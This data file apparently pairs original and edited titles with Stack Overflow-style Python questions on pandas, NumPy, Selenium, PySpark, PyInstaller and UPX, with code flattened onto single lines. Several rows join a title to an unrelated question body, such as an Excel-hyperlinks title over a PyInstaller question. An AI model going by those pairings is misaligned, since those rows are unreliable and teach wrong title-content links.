Pandas Merge Rows," I have a pandas DataFrame where some pairs of rows have the same ID but different name. What I want is to reduce the row pair to one row, and display both of their names.INPUT: OUTPUT: Otherwise, I can also do ['Tom', 'Roberts'], or any other method that still captures the data. <code>  ID NAME AGE149 Bob 32150 Tom 53150 Roberts 53151 Pamela 28152 Andrew 23 ID NAME AGE149 Bob 32150 Tom Roberts 53151 Pamela 58152 Andrew 23",Merge rows within a group together
"In pandas, how to create a new column with a rank accoriding to the mean values of another column"," I have the following pandas dataframe I want to create a new column that ranks each of the countries according to the mean of their values from largest to smallestThe output would look like the following Note that I don't need the average column, its just there to help with the explanation.Many thanks <code>  +---------+-------+| Country | value |+---------+-------+| UK | 42 || US | 9 || US | 10 || France | 15 || France | 16 || Germany | 17 || Germany | 18 || Germany | 20 |+---------+-------+ +---------+-------+---------+------+| Country | value | Average | Rank |+---------+-------+---------+------+| UK | 42 | 42 | 1 || US | 9 | 9.5 | 4 || US | 10 | 9.5 | 4 || France | 15 | 15.5 | 3 || France | 16 | 15.5 | 3 || Germany | 17 | 18 | 2 || Germany | 18 | 18 | 2 || Germany | 20 | 18 | 2 |+---------+-------+---------+------+","In pandas, how to create a new column with a rank according to the mean values of another column"
How to make firefox headless programatically in Selenium with python?," I am running this code with python, selenium, and firefox but still get 'head' version of firefox: I also tried some variations of binary: <code>  binary = FirefoxBinary('C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe', log_file=sys.stdout)binary.add_command_line_options('-headless')self.driver = webdriver.Firefox(firefox_binary=binary) binary = FirefoxBinary('C:\\Program Files\\Nightly\\firefox.exe', log_file=sys.stdout) binary.add_command_line_options(""--headless"")",How to make Firefox headless programmatically in Selenium with Python?
How to make firefox headless programmatically in Selenium with python?," I am running this code with python, selenium, and firefox but still get 'head' version of firefox: I also tried some variations of binary: <code>  binary = FirefoxBinary('C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe', log_file=sys.stdout)binary.add_command_line_options('-headless')self.driver = webdriver.Firefox(firefox_binary=binary) binary = FirefoxBinary('C:\\Program Files\\Nightly\\firefox.exe', log_file=sys.stdout) binary.add_command_line_options(""--headless"")",How to make Firefox headless programmatically in Selenium with Python?
How to catch exceptions in a python run_in_executor method," How can i raise the exception in the run_long_thing() function called with the run_in_executor?It looks like it is being swallowed. I don't need the result of the function in the blocking code. It is basically a fire and forget function, but still i need to catch the exceptions if there are any... <code>  import asyncioimport timedef fire_and_forget(task, *args, **kwargs): loop = asyncio.get_event_loop() if callable(task): #if threadpoolworker is set to None, #the max_workers will default to the number of processors on the machine, multiplied by 5 return loop.run_in_executor(None, task, *args, **kwargs) else: raise TypeError('Task must be a callable.')async def run_long_thing(sleep): print(""Doing long thing... {:}"".format(sleep)) time.sleep(sleep) print(""Done doing long thing. {:}"".format(sleep)) raise Exception(""sh*t happens"")def do_it(): print(""Starting my main thing..."") print(""Calling my long thing..."") for i in range(0,10,1): try: fire_and_forget(run_long_thing, i) print(i) print(""Pom pi dom..."") time.sleep(0.1) print(""POOOOM Pom pi dom..."") except: print(""can i see the sh*t?"")do_it()",How to catch exceptions in a python run_in_executor method call
How to solve a system of linear equations in the nonegative integers," Given a linear system Ax = b, where matrix A and vector b have integer values, I want to find all nonnegative integer vectors x that solve this equation.So far, I have found some techniques such as the Smith normal form or the Hermite normal form of a matrix to find integer solutions, and I guess I could then use a linear solver to find nonnegative solutions. Is there a library that could make this easier?Python solutions would be ideal, but if a library exists in another language I want to know about it. <code> ",How to solve a system of linear equations over the nonnegative integers?
How to solve a system of linear equations over the nonegative integers?," Given a linear system Ax = b, where matrix A and vector b have integer values, I want to find all nonnegative integer vectors x that solve this equation.So far, I have found some techniques such as the Smith normal form or the Hermite normal form of a matrix to find integer solutions, and I guess I could then use a linear solver to find nonnegative solutions. Is there a library that could make this easier?Python solutions would be ideal, but if a library exists in another language I want to know about it. <code> ",How to solve a system of linear equations over the nonnegative integers?
How to get Chromedriver in headless mode to run headless?," I'm working on a python script to web-scrape and have gone down the path of using Chromedriver as one of the packages. I would like this to operate in the background without any pop-up windows. I'm using the option 'headless' on chromedriver and it seems to do the job in terms of not showing the browser window, however, I still see the .exe file running. See the screenshot of what I'm talking about. ScreenshotThis is the code I am using to initiate ChromeDriver: Things I've tried to do is alter the window size in the options to 0x0 but I'm not sure that did anything as the .exe file still popped up.Any ideas of how I can do this?I am using Python 2.7 FYI <code>  options = webdriver.ChromeOptions()options.add_experimental_option(""excludeSwitches"",[""ignore-certificate-errors""])options.add_argument('headless')options.add_argument('window-size=0x0')chrome_driver_path = ""C:\Python27\Scripts\chromedriver.exe""",How to configure ChromeDriver to initiate Chrome browser in Headless mode through Selenium?
Updating count in a nested for loop in Jinja," I want to loop over a list of objects and count how many objects meet a requirement. I based my code off other examples I'd found, but it doesn't work, the count is always 0 after the loop.For each house, I want to loop over each room and count how many rooms have a bed. I want to output that then reset the count for the next house. <code>  {% for house in city %}{% set count = 0 %} <div>{{ house.address }} has {{ count }} beds in it rooms.</div> {% for room in house %} {% if room.has_bed == True %}{% set count = count + 1 %}{% endif %} {% endfor %}{% endfor %}",Setting variable in Jinja for loop doesn't persist between iterations
Cross-entropy loss in tensorflow," Classification problems, such as logistic regression or multinomiallogistic regression, optimize a cross-entropy loss.Normally, the cross-entropy layer follows the softmax layer,which produces probability distribution.In tensorflow, there are at least a dozen of different cross-entropy loss functions:tf.losses.softmax_cross_entropytf.losses.sparse_softmax_cross_entropytf.losses.sigmoid_cross_entropytf.contrib.losses.softmax_cross_entropytf.contrib.losses.sigmoid_cross_entropytf.nn.softmax_cross_entropy_with_logitstf.nn.sigmoid_cross_entropy_with_logits...Which one works only for binary classification and which are suitable for multi-class problems? When should you use sigmoid instead of softmax? How are sparse functions different from others and why is it only softmax?Related (more math-oriented) discussion: What are the differences between all these cross-entropy losses in Keras and TensorFlow?.  <code> ",How to choose cross-entropy loss in TensorFlow?
How to choose cross-entropy loss in tensorflow?," Classification problems, such as logistic regression or multinomiallogistic regression, optimize a cross-entropy loss.Normally, the cross-entropy layer follows the softmax layer,which produces probability distribution.In tensorflow, there are at least a dozen of different cross-entropy loss functions:tf.losses.softmax_cross_entropytf.losses.sparse_softmax_cross_entropytf.losses.sigmoid_cross_entropytf.contrib.losses.softmax_cross_entropytf.contrib.losses.sigmoid_cross_entropytf.nn.softmax_cross_entropy_with_logitstf.nn.sigmoid_cross_entropy_with_logits...Which one works only for binary classification and which are suitable for multi-class problems? When should you use sigmoid instead of softmax? How are sparse functions different from others and why is it only softmax?Related (more math-oriented) discussion: What are the differences between all these cross-entropy losses in Keras and TensorFlow?.  <code> ",How to choose cross-entropy loss in TensorFlow?
Python Error when calling numpy from class method with map," The following code throws me the error: Code: I believe I made a serious mistake, because it seems like Python interprets the 'np' from NumPy as an integer, but I have no glimpse why that is. <code>  Traceback (most recent call last): File """", line 25, in <module> sol = anna.main() File """", line 17, in main sol = list(map(self.eat, self.mice)) File """", line 12, in eat calc = np.sqrt((food ** 5))AttributeError: 'int' object has no attribute 'sqrt' import numpy as np#import timeclass anaconda(): def __init__(self): self.mice = range(10000) def eat(self, food): calc = np.sqrt((food ** 5)) return calc def main(self): sol = list(map(self.eat, self.mice)) return solif __name__ == '__main__': #start = time.time() anna = anaconda() sol = anna.main() print(len(sol)) #print(time.time() - start)",Python error when calling NumPy from class method with map
Pandas Loc Index and Column Condition," I have a simplified Dataframe which can be set up as follows: The Dataframe looks like: I want to find the rows that are in this list:FwdTimeChangeDates = ['28/10/2018', '27/10/2019']with Period that is > 2.I want to +=2 to the Period with those conditions (So Period 3-->5, and 4-->6, etc.).How do I filter based on the two conditions?df.loc[FwdTimeChangeDates] Gives:Period A B C28/10/2018 1 NaN NaN NaN28/10/2018 2 NaN NaN NaN28/10/2018 3 NaN NaN NaN27/10/2019 1 NaN NaN NaN27/10/2019 2 NaN NaN NaN27/10/2019 3 NaN NaN NaNand df.loc[df.Period>2]GivesPeriod A B C01/10/2017 3 NaN NaN NaN28/10/2018 3 NaN NaN NaN27/10/2019 3 NaN NaN NaN30/10/2019 3 NaN NaN NaNand I want:Period A B C28/10/2018 3 NaN NaN NaN27/10/2019 3 NaN NaN NaNBut I can't join the two conditions with:df.loc[FwdTimeChangeDates & df.Period>1] ordf.loc[(FwdTimeChangeDates) & (df.Period>1)] <code>  indexes =['01/10/2017', '28/10/2018', '27/10/2019', '30/10/2019']cols = ['Period', 'A', 'B', 'C']df= pd.DataFrame(index = indexes, columns= cols)df.Period = 1df = pd.concat([df, 2*df.copy(), 3*df.copy()])df.sort_index() Period A B C01/10/2017 1 NaN NaN NaN01/10/2017 2 NaN NaN NaN01/10/2017 3 NaN NaN NaN27/10/2019 1 NaN NaN NaN27/10/2019 2 NaN NaN NaN27/10/2019 3 NaN NaN NaN28/10/2018 1 NaN NaN NaN28/10/2018 2 NaN NaN NaN28/10/2018 3 NaN NaN NaN30/10/2019 1 NaN NaN NaN30/10/2019 2 NaN NaN NaN30/10/2019 3 NaN NaN NaN",Pandas Loc select by index as well as boolean condition in single expression
Numpy: vies vs copy by slicing," When I am doing the slicing, an unexpected thing happened that seems the first to be view but the second is copy. FirstFirst slice of row, then slice of column. It seems is a view. SecondBut if I first slice of column, then slice of row, it seems a copy: I am confused because the two methods finally will cause seem position to change, but why the second actually doesn't change the number? <code>  >>> a = np.arange(12).reshape(3, 4) >>> a[0:3:2, :][:, [0, 2]] = 100>>> aarray([[100, 1, 100, 3], [ 4, 5, 6, 7], [100, 9, 100, 11]]) >>> a[:, [0, 2]][0:3:2, :] = 0>>> aarray([[100, 1, 100, 3], [ 4, 5, 6, 7], [100, 9, 100, 11]])",Numpy: views vs copy by slicing
deceptively implementation of topological sorting in python," Extracted from here we got a minimal iterative dfs routine, i call it minimal because you can hardly simplify the code further: Here's my question, how could you transform this routine into a topological sort method where the routine also becomes ""minimal""? I've watched this video and the idea is quite clever so I was wondering if it'd be possible to apply the same trick into the above code so the final result of topological_sort also becomes ""minimal"".Not asking for a version of topological sorting which is not a tiny modification of the above routine, i've already seen few of them. The question is not ""how do i implement topological sorting in python"" but instead, finding the smallest possible set of tweaks of the above code to become a topological_sort.ADDITIONAL COMMENTSIn the original article the author says : A while ago, I read a graph implementation by Guido van Rossen that was deceptively simple. Now, I insist on a pure python minimal system with the least complexity. The idea is to be able to explore the algorithm. Later, you can refine and optimize the code but you will probably want to do this in a compiled language.The goal of this question is not optimizing iterative_dfs but instead coming up with a minimal version of topological_sort derived from it (just for the sake of learning more about graph theory algorithms). In fact, i guess a more general question could be something like given the set of minimal algorithms, {iterative_dfs, recursive_dfs, iterative_bfs, recursive_dfs}, what would be their topological_sort derivations? Although that would make the question more long/complex, so figuring out the topological_sort out of iterative_dfs is good enough. <code>  def iterative_dfs(graph, start, path=[]): q = [start] while q: v = q.pop(0) if v not in path: path = path + [v] q = graph[v] + q return pathgraph = { 'a': ['b', 'c'], 'b': ['d'], 'c': ['d'], 'd': ['e'], 'e': []}print(iterative_dfs(graph, 'a'))",deceptively simple implementation of topological sorting in python
Get the attributes of the select item in a GeoJSONDataSource," I want to link a plot containing patches (from a GeoJSONDataSource) with a line chart but i'm having trouble getting the attributes of the selected patch.Its basically a plot showing polygons, and when a polygon is selected, i want to update the line chart with a timeseries of data for that polygon. The line chart is driven by a normal ColumnDataSource.I can get the indices of the selected patch by adding a callback combined with geo_source.selected['1d']['indices']. But how do i get the data/attributes which correspond to that index? I need to get a 'key' in the attributes which i can then use to update the line chart.The GeoJSONDataSource has no data attribute in which i can lookup the data itself. Bokeh can use the attributes for things like coloring/tooltips etc, so i assume there must be a way to get these out of the GeoJSONDataSource, i cant find it unfortunately.edit:Here is working toy example showing what i've got so far. Save the code in a .py file and load with bokeh serve example.py --show <code>  import pandas as pdimport numpy as npfrom bokeh import eventsfrom bokeh.models import (Select, Column, Row, ColumnDataSource, HoverTool, Range1d, LinearAxis, GeoJSONDataSource)from bokeh.plotting import figurefrom bokeh.io import curdocimport osimport datetimefrom collections import OrderedDictdef make_plot(src): # function to create the line chart p = figure(width=500, height=200, x_axis_type='datetime', title='Some parameter', tools=['xwheel_zoom', 'xpan'], logo=None, toolbar_location='below', toolbar_sticky=False) p.circle('index', 'var1', color='black', fill_alpha=0.2, size=10, source=src) return pdef make_geo_plot(src): # function to create the spatial plot with polygons p = figure(width=300, height=300, title=""Select area"", tools=['tap', 'pan', 'box_zoom', 'wheel_zoom','reset'], logo=None) p.patches('xs', 'ys', fill_alpha=0.2, fill_color='black', line_color='black', line_width=0.5, source=src) p.on_event(events.SelectionGeometry, update_plot_from_geo) return pdef update_plot_from_geo(event): # update the line chart based on the selected polygon selected = geo_source.selected['1d']['indices'] if (len(selected) > 0): first = selected[0] print(geo_source.selected['1d']['indices'])def update_plot(attrname, old, new): # Callback for the dropdown menu which updates the line chart new_src = get_source(df, area_select.value) src.data.update(new_src.data) def get_source(df, fieldid): # function to get a subset of the multi-hierarchical DataFrame # slice 'out' the selected area dfsub = df.xs(fieldid, axis=1, level=0) src = ColumnDataSource(dfsub) return src# example timeseriesn_points = 100df = pd.DataFrame({('area_a','var1'): np.sin(np.linspace(0,5,n_points)) + np.random.rand(100)*0.1, ('area_b','var1'): np.sin(np.linspace(0,2,n_points)) + np.random.rand(100)*0.1, ('area_c','var1'): np.sin(np.linspace(0,3,n_points)) + np.random.rand(100)*0.1, ('area_d','var1'): np.sin(np.linspace(0,4,n_points)) + np.random.rand(100)*0.1}, index=pd.DatetimeIndex(start='2017-01-01', freq='D', periods=100))# example polygonsgeojson = """"""{""type"":""FeatureCollection"",""crs"":{""type"":""name"",""properties"":{""name"":""urn:ogc:def:crs:OGC:1.3:CRS84""}},""features"":[{""type"":""Feature"",""properties"":{""key"":""area_a""},""geometry"":{""type"":""MultiPolygon"",""coordinates"":[[[[-108.8,42.7],[-104.5,42.0],[-108.3,39.3],[-108.8,42.7]]]]}},{""type"":""Feature"",""properties"":{""key"":""area_b""},""geometry"":{""type"":""MultiPolygon"",""coordinates"":[[[[-106.3,44.0],[-106.2,42.6],[-103.3,42.6],[-103.4,44.0],[-106.3,44.0]]]]}},{""type"":""Feature"",""properties"":{""key"":""area_d""},""geometry"":{""type"":""MultiPolygon"",""coordinates"":[[[[-104.3,41.0],[-101.5,41.0],[-102.9,37.8],[-104.3,41.0]]]]}},{""type"":""Feature"",""properties"":{""key"":""area_c""},""geometry"":{""type"":""MultiPolygon"",""coordinates"":[[[[-105.8,40.3],[-108.3,37.7],[-104.0,37.4],[-105.8,40.3]]]]}}]}""""""geo_source = GeoJSONDataSource(geojson=geojson)# populate a drop down menu with the area's area_ids = sorted(df.columns.get_level_values(0).unique().values.tolist())area_ids = [str(x) for x in area_ids]area_select = Select(value=area_ids[0], title='Select area', options=area_ids)area_select.on_change('value', update_plot)src = get_source(df, area_select.value)p = make_plot(src)pgeo = make_geo_plot(geo_source)# add to documentcurdoc().add_root(Row(Column(area_select, p), pgeo))",Get the attributes of the selected item in a GeoJSONDataSource
How can I replace a file if already exists in the destination folder? [python]," I just want to move a file from one folder to another (already know how to do that) and in the process check all the files in the destination folder and delete the files with the same name.I have two folders /src and /dst.In folder /src I have: 'access.log.1.txt' and in folder /dst : 'access.log.1.20171110_115840565311.txt' 'access.log.1.20171110_115940565311.txt' 'access.log.2.20171110_115940565311.txt' When I move the file in /src to /dst I want to delete all the files named as the file in /src excluding the datetime() extension in the files of /dst.So the /dst folder should look like this after the execution: 'access.log.1.txt' 'access.log.2.20171110_115940565311.txt' This is the code I have to move files from /src to /dst: Anyone could help me?Thanks!! <code>  entrada = ENTRADA #This 3 are the paths to the folders /srcsalida = SALIDA # /dsterror=ERROR # /errfiles=glob.glob(entrada)for file in files: fichero=open(file,encoding='utf-8') try: for line in fichero: la=line.replace(""-"","""") li=la.replace(''+chr(10),'') li=li.split('""') line_DB(li) fichero.close() if TIME_RENAME=='True': execution=str(datetime.now()) execution=execution.replace('.','') execution=execution.replace('-','') execution=execution.replace(' ','_') execution_time=execution.replace(':','') base = os.path.splitext(file)[0] base=base+'.'+execution_time+'.txt' os.rename(file,base) file=base else: print('Hello') #This is where I need the code shutil.move(file, salida) con.commit() except: logging.error(sys.exc_info()) print(sys.exc_info()) fichero.close() shutil.move(file, error)",How can I replace a file if already exists in the destination folder?
removing special characters from a list of items in python," I have a list of elements containing special characters. I want to convert the list to only alphanumeric characters. No special characters.my_list = [""on@3"", ""two#"", ""thre%e""]my expected output is, I cannot simply apply strip() to these items, please help. <code>  out_list = [""one"",""two"",""three""]",How can I remove special characters from a list of elements in python?
"Pandas, is there any faster ways to update values?"," Currently, my table has over 10000000 records, and there is a column named ID, and I want to update column named '3rd_col' with a new value if the ID is in the given list.I use .loc and here is my code But the performance of the above code is slow, how can I improve the performance of updating value?Sorry, here I want to be more specific on my problem, different id has different values to be assigned based on a function and there are about 4 columns to be assigned. <code>  for _id in given_ids: df.loc[df.ID == _id, '3rd_col'] = new_value for _id in given_ids: df.loc[df.ID == _id, '3rd_col'] = return_new_val_1(id) df.loc[df.ID == _id, '4rd_col'] = return_new_val_2(id) df.loc[df.ID == _id, '5rd_col'] = return_new_val_3(id) df.loc[df.ID == _id, '6rd_col'] = return_new_val_4(id)","Pandas, are there any faster ways to update values?"
Python3 find crc32 of string," I tried to get crc32 of a string data type variable but getting the following error. For a string values it can be done with binascii.crc32(b'hello world!') but I would like to know how to do this for a string data-type variable <code>  >>> message='hello world!'>>> import binascii>>> binascii.crc32(message)Traceback (most recent call last): File ""<stdin>"", line 1, in <module>TypeError: a bytes-like object is required, not 'str'",Python find CRC32 of string
"""Merging"" Python arrays together with a common dimension"," I have two matricies, corresponding to data points (x,y1) and (x,y2): I'd like to create a new matrix that combines the x values into a single column, and has NaNs in the appropriate y1, y2 columns: Is there an easy way to do this? I'm new to Python and NumPy (coming from MATLAB) and I'm not sure how I would even begin with this. (For reference, my approach to this in MATLAB is simply using an outerjoin against two tables that are generated with array2table.) <code>  x | y1------------ 0 | 0 1 | 1 2 | 2 3 | 3 4 | 4 5 | 5 x | y2---------------- 0.5 | 0.5 1.5 | 1.5 2.5 | 2.5 3.5 | 3.5 4.5 | 4.5 5.5 | 5.5 x | y1 | y2----------------------------- 0 | 0 | NaN 0.5 | NaN | 0.5 1 | 0 | NaN 1.5 | NaN | 1.5 ... | ... | ... 5 | 5 | NaN 5.5 | NaN | 5.5 ","""Merging"" numpy arrays together with a common dimension"
"Cannot find imports, wanting to add collection of imports"," I am trying to print coloured text with colorama but when I compile an exe and run following... Output: Is it possible to print colors when compiling to pyinstaller exe or is this simply not possible? <code>  from colorama import Fore, Back, Styleprint(Fore.RED + 'text')print(Back.GREEN + 'and with a green background')print(Style.DIM + 'and in dim text')print(Style.RESET_ALL)print('back to normal now')I get output of:: [31mtext[0mback to normal now",output of [31m text instead of color
print exact value of tensor(floating ponit) with pytorch," I'm trying to print torch.FloatTensor like: This way I can get a value like: But I want to get more accurate value, like 10 decimal point: With other python numerical objects, I could get it with: but in the case of a tensor, I get this error: How can I print more precise values of tensors? <code>  a = torch.FloatTensor(3,3)print(a) 0.0000e+00 0.0000e+00 3.2286e-411.2412e-40 1.2313e+00 1.6751e-372.6801e-36 3.5873e-41 9.4463e+21 0.1234567891+01 print('{:.10f}'.format(a)) TypeError: unsupported format string passed to torch.FloatTensor.__format__",Print exact value of PyTorch tensor (floating point precision)
print exact value of tensor(floating point precision) with pytorch," I'm trying to print torch.FloatTensor like: This way I can get a value like: But I want to get more accurate value, like 10 decimal point: With other python numerical objects, I could get it with: but in the case of a tensor, I get this error: How can I print more precise values of tensors? <code>  a = torch.FloatTensor(3,3)print(a) 0.0000e+00 0.0000e+00 3.2286e-411.2412e-40 1.2313e+00 1.6751e-372.6801e-36 3.5873e-41 9.4463e+21 0.1234567891+01 print('{:.10f}'.format(a)) TypeError: unsupported format string passed to torch.FloatTensor.__format__",Print exact value of PyTorch tensor (floating point precision)
Pass dataframe as input to Spark UDF (PySpark)," I have a dataframe and I want to apply a function to each row. This function depends of other dataframes. Simplified example. I have three dataframes like below: For each row of df, I want to collect the unique upper values for feat1 and feat2 from df_other_1 and df_other_2, i.e. for first row, the unique values are (1, 3, 10, 4, 20, 30). Then, I'll sort them like (30, 20, 10, 4, 3, 1) and add to the front, one number above the first one. The df would become like so: Then, for each row of df and for each of the respective values of the lst, I want to calculate the sum of score from both df_other_1 and df_other_2 where each value of lst falls within upper and lower. My goal is to find the lowest value in each lst whose total score is above some threshold (e.g. 1.4).Here's how to calculate the total score. So, for the first row of df, the first value of lst is 31. In df_other_1 for feat1, it is above the highest bucket so it would get a score of 1. Same for df_other_2. So, the total score would be 1+1 =2. For the value of 10 (again for the first row), the total score would be 1 + 0.5 = 1.5.This is how the df would look like in the end: I'm actually looking to find these target values 4 and 25. The intermediate steps do not really matter.==========================================================================Here's what I tried so far: But I'm getting:AttributeError: 'Py4JError' object has no attribute 'message'Sorry for the long post. Any ideas? <code>  df = sc.parallelize([ ['a', 'b', 1], ['c', 'd', 3] ]).toDF(('feat1', 'feat2', 'value'))df_other_1 = sc.parallelize([ ['a', 0, 1, 0.0], ['a', 1, 3, 0.1], ['a', 3, 10, 1.0], ['c', 0, 10, 0.2], ['c', 10, 25, 0.5] ]).toDF(('feat1', 'lower', 'upper', 'score'))df_other_2 = sc.parallelize([ ['b', 0, 4, 0.1], ['b', 4, 20, 0.5], ['b', 20, 30, 1.0], ['d', 0, 5, 0.05], ['d', 5, 22, 0.9] ]).toDF(('feat1', 'lower', 'upper', 'score')) df = sc.parallelize([ ['a', 'b', 1, [31, 30, 20, 10, 4, 3, 1]], ['c', 'd', 3, [26, 25, 22, 10, 5]] ]).toDF(('feat1', 'feat2', 'value', 'lst')) df = sc.parallelize([ ['a', 'b', 1, [31, 30, 20, 10, 4, 3, 1], [2.0, 2.0, 2.0, 1.5, 1.5, 1.1, 0.2], 4], ['c', 'd', 3, [26, 25, 22, 10, 5], [2.0, 1.5, 1.4, 1.4, 1.1], 25] ]).toDF(('feat1', 'feat2', 'value', 'lst', 'total_scores', 'target_value')) def get_threshold_for_row(feat1, feat2, threshold): this_df_other_1 = df_other_1.filter(col('feat1') == feat1) this_df_other_2 = df_other_2.filter(col('feat1') == feat2) values_feat_1 = [i[0] for i in this_df_other_1.select('upper').collect()] values_feat_1.append(values_feat_1[-1] + 1) values_feat_2 = [i[0] for i in this_df_other_2.select('upper').collect()] values_feat_2.append(values_feat_2[-1] + 1) values = values_feat_1 + values_feat_2 values = list(set(values)) #Keep unique values values.sort(reverse=True) #Sort from largest to smallest df_1_score = df_2_score = 0 prev_value = 10000 #Any large number prev_score = 10000 for value in values: df_1_score = get_score_for_key(this_df_other_1, 'feat_1', feat_1, value) df_2_score = get_score_for_key(this_df_other_2, 'feat_1', feat_2, value) total_score = df_1_score + df_2_score if total_score < threshold and prev_score >= threshold: return prev_value prev_score = total_score prev_value = valuedef is_dataframe_empty(df): return len(df.take(1)) == 0def get_score_for_key(scores_df, grouping_key, this_id, value): if is_dataframe_empty(scores_df): return 0.0 w = Window.partitionBy([grouping_key]).orderBy(col('upper')) scores_df_tmp = scores_df.withColumn(""prev_value"", lead(scores_df.upper).over(w))\ .withColumn(""is_last"", when(col('prev_value').isNull(), 1).otherwise(0))\ .drop('prev_value') scores_df_tmp = scores_df_tmp.withColumn(""next_value"", lag(scores_df_tmp.upper).over(w))\ .withColumn(""is_first"", when(col('next_value').isNull(), 1).otherwise(0))\ .drop('next_value').cache() grouping_key_score = scores_df_tmp.filter((col(grouping_key) == this_id) & (((value >= col('from_value')) & (value < col('to_value'))) | ((value >= col('to_value')) & (col('is_last') == 1)) | ((value < col('from_value')) & (col('is_first') == 1)) | (col('from_value').isNull()))) \ .withColumn('final_score', when(value <= col('to_value'), col('score')).otherwise(1.0)) \ .collect()[0]['final_score'] return grouping_key_scoredf.rdd.map(lambda r: (r['feat_1'], r['feat_2'])) \ .map(lambda v: (v[0], v[1], get_threshold_for_row(v[0], v[1], 1.4))) .toDF()",How to pass DataFrame as input to Spark UDF?
Whats the difference between pseudo-random and secure pseudo-random number generator?, On the random module python page (Link Here) there is this warning: Warning: The pseudo-random generators of this module should not be used for security purposes. Use os.urandom() or SystemRandom if you require a cryptographically secure pseudo-random number generator.So whats the difference between os.urandom() and random? Is one closer to a true random than the other? Would the secure random be overkill in non-cryptographic instances?Are there any other random modules in python? <code> ,Whats the difference between os.urandom() and random?
Is there anything faster than dict()," I am leaning n-gram, and building a dictionary to save n-gram values. I have something like this: My dictionary has about 3million keys and it takes 0.0002(s) to get a bigramvalue. Is there anything faster than dict that I could use? <code>  { ""it is"" : 0.01, ""this is"" : 0.005, ""hello i"" : 0.2 ""hello you"" : 0.3 ...}",Is there anything faster than a dictionary?
numpy - how to select all elements in an array except for a sequence of indices?," Say I have some long array and a list of indices. How can I select everything except those indices? I found a solution but it is not elegant: <code>  import numpy as npx = np.array([0,10,20,30,40,50,60])exclude = [1, 3, 5]print x[list(set(range(len(x))) - set(exclude))]",How to select all elements in a NumPy array except for a sequence of indices
Python - Sort tuple list with another list," I have a tuple list to_order such as: And a list which gives the order to apply to the second element of each tuple of to_order: So I am looking for a way to get this output: Any ideas? <code>  to_order = [(0, 1), (1, 3), (2, 2), (3,2)] order = [2, 1, 3] ordered_list = [(2, 2), (3,2), (0, 1), (1, 3)]",Sort tuple list with another list
Pandas DataFrame: test if index is set," I have a DataFrame with multiple columns of which one is of type datetime. Sometimes this column is used as index via df.set_index(...).On other occasions I need to reset that index in order to keep the datetime column. Now I'm looking for a way how to check if the dataframe has a default index or not. I tried this, but this is not working for all cases: I could test if the index is of type datetime, but I really wonder if there is a general method like df.is_index_set(). Any recommendations? <code>  if df.index.name is not None: df.reset_index(inplace=True)",Pandas DataFrame: test if index name is set
Adding hyperlinks to an excel file Pandas," I have a simple pandas pyinstaller exe which is over 40MB.My exe example: 40MB+ for this seems a bit overkill.How can I reduce this as much as possible?One method: This however is not practical considering how big the exclusion list would be.How do I select a folder for pyinstaller to get modules from and exclude everything else so I may have a small application?Spec file: It's also worth mentioning. By default, Pyinstaller does not detect pandas. Add: A possible solution when using multiple executables, could be to link each executable to a separate folder or executable with all imports.  <code>  import collectionsimport csvimport seleniumimport pandasprint('hi') pyinstaller --onefile --exclude matplotlib --exclude scipy --exclude pandas --exclude numpy.py a = Analysis(['123.py'], pathex=['C:\\Users\\AA\\ZZ'], binaries=[], datas=[], hiddenimports=[], hookspath=[], runtime_hooks=[], excludes=[], win_no_prefer_redirects=False, win_private_assemblies=False, cipher=block_cipher)pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)exe = EXE(pyz, a.scripts, a.binaries, a.zipfiles, a.datas, name='123', debug=False, strip=False, upx=True, runtime_tmpdir=None, console=True ) hiddenimports = ['pandas._libs.tslibs.timedeltas']To: C:\Users\<NAME>\AppData\Local\Programs\Python\Python36\Lib\site-packages\PyInstaller\hooks",Reducing size of pyinstaller exe
how to write workbook names to each workbook for dataframe," How do I use UPX with pyinstaller?I am following the docs.I have downloaded UPX.My file looks like: I then run: This does not affect the size of the file. Any idea how I can get this to work? <code>  import csvimport seleniumimport pandasprint('Hello') pyinstaller -F --upx-dir C:\Users\DD\Downloads\upx394w\upx394w\123\upx308w\upx.exe zz.spec # -*- mode: python -*-block_cipher = Nonea = Analysis(['zz.py'], pathex=['C:\\Users\\DA\\13\\14'], binaries=[], datas=[], hiddenimports=[], hookspath=[], runtime_hooks=[], excludes=[], win_no_prefer_redirects=False, win_private_assemblies=False, cipher=block_cipher)pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)exe = EXE(pyz, a.scripts, a.binaries, a.zipfiles, a.datas, name='zz', debug=False, strip=False, upx=True, runtime_tmpdir=None, console=True )",How do I use UPX with pyinstaller?
Using UPX on a pyinstaller executable," How do I use UPX with pyinstaller?I am following the docs.I have downloaded UPX.My file looks like: I then run: This does not affect the size of the file. Any idea how I can get this to work? <code>  import csvimport seleniumimport pandasprint('Hello') pyinstaller -F --upx-dir C:\Users\DD\Downloads\upx394w\upx394w\123\upx308w\upx.exe zz.spec # -*- mode: python -*-block_cipher = Nonea = Analysis(['zz.py'], pathex=['C:\\Users\\DA\\13\\14'], binaries=[], datas=[], hiddenimports=[], hookspath=[], runtime_hooks=[], excludes=[], win_no_prefer_redirects=False, win_private_assemblies=False, cipher=block_cipher)pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)exe = EXE(pyz, a.scripts, a.binaries, a.zipfiles, a.datas, name='zz', debug=False, strip=False, upx=True, runtime_tmpdir=None, console=True )",How do I use UPX with pyinstaller?
comparing shapes to find degree of similarity in a fixed Region Of Interest for all images," I am relatively a newbie to computer vision and now currently doing a learning project on shape detection where I have a fixed region of interest(ROI) in all the images where the object is most likely present and I have to compare their shapes to give whether the object present in two input images are same or not.There are slight translational and scale changes and illumination changes. I am trying to compare the shape of the object between two input images and trying to provide an output value describing their similarity. If the similarity is above a certain threshold, I can tell that the same object is present in both input images. I have tried contours, but it does not give reliable results(thresholding either gives too many details or misses some vital details) and doesn't generalize well to all images. I am thinking of using global shape descriptors like HOG. But I have problems with understanding the feature vector values from the HOG descriptor. How to compare HOG feature vectors(1D) for the two input images to find similarity without using SVM or machine learning? What is the best way to compare HOG feature vectors?I don't understand how the distance measures work for comparing the future vectors. I want to understand the physical meaning of how distances are used to compare feature vectors and histograms? How to use them to compare HOG feature vectors? <code> ",comparing HOG feature vectors without SVM
